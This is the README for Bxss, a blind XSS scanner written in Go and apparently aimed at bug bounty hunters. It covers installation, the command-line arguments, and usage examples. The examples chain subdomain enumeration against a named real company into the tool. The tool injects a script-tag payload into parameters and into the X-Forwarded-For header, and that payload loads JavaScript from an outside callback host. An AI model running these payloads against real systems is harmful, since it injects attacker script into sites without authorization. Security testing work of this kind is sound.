<h1 align="center">
  <br>
  <img src="https://github.com/ethicalhackingplayground/bxss/blob/master/static/blinded-drib.png" width="200px" alt="Bxss">
  <br>
  Bxss - Blind XSS Scanner
</h1>

<p align="center">
  <a href="https://github.com/ethicalhackingplayground/bxss/releases/latest">
    <img src="https://img.shields.io/github/v/release/ethicalhackingplayground/bxss?style=flat-square" alt="Version">
  </a>
  <a href="https://github.com/ethicalhackingplayground/bxss/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square" alt="License">
  </a>
  <a href="https://goreportcard.com/report/github.com/ethicalhackingplayground/bxss">
    <img src="https://goreportcard.com/badge/github.com/ethicalhackingplayground/bxss?style=flat-square" alt="Go Report Card">
  </a>
  <a href="https://pkg.go.dev/github.com/ethicalhackingplayground/bxss">
    <img src="https://pkg.go.dev/badge/github.com/ethicalhackingplayground/bxss.svg" alt="Go Reference">
  </a>
</p>

---

## 🚀 Description
Bxss is a high-performance Blind XSS scanner that automates the detection of blind XSS vulnerabilities in web applications.

---

## ✨ Features
- Injects Blind XSS payloads into custom headers & parameters
- Supports multiple HTTP methods (PUT, POST, GET, OPTIONS)
- High-speed scanning with concurrency support
- Easily chainable with other tools
- Simple installation and usage

---

## 📦 Installation
```bash
go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
```

---

## ⚙️ Arguments

| Argument       | Description                                             | Default  |
| ------------- | -------------------------------------------------------- | -------- |
| `-a`          | Append the payload to the parameter                      | `false`  |
| `-c int`      | Set the concurrency level                                | `30`     |
| `-H string`   | Set a custom header                                      | `""`     |
| `-hf string`  | Path to file with headers                                | `""`     |
| `-p string`   | The blind XSS payload                                    | `""`     |
| `-pf string`  | Path to file with payloads                               | `""`     |
| `-t`          | Test parameters for blind XSS                            | `false`  |
| `-X string`   | HTTP method to use                                       | `""`  |
| `-v`          | Enable debug mode                                        | `false`  |
| `-rl float`   | Rate limit (requests per second)                         | `0`      |
| `-f`          | Follow redirects                                         | `false`  |
---

## 🎬 Demonstration
<p align="center">
  <a href="https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm">
    <img src="https://asciinema.org/a/mPB0Vms70kvD8dd99BwYi1ucm.svg" alt="Demo">
  </a>
</p>

---

## 🔥 Usage Examples

### Injecting Blind XSS Into Parameters
```bash
subfinder -d uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/username></script>' -parameters
```

### Injecting Blind XSS Into X-Forwarded-For Header
```bash
subfinder -d uber.com | gau | bxss -payload '"><script src=https://xss.report/c/username></script> -header "X-Forwarded-For"
```

---

## ☕ Support the Project
If you get a bounty using this tool, consider supporting by buying me a coffee!

<p align="center">
  <a href="https://buymeacoffee.com/zoidsec" target="_blank">
    <img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;">
  </a>
</p>

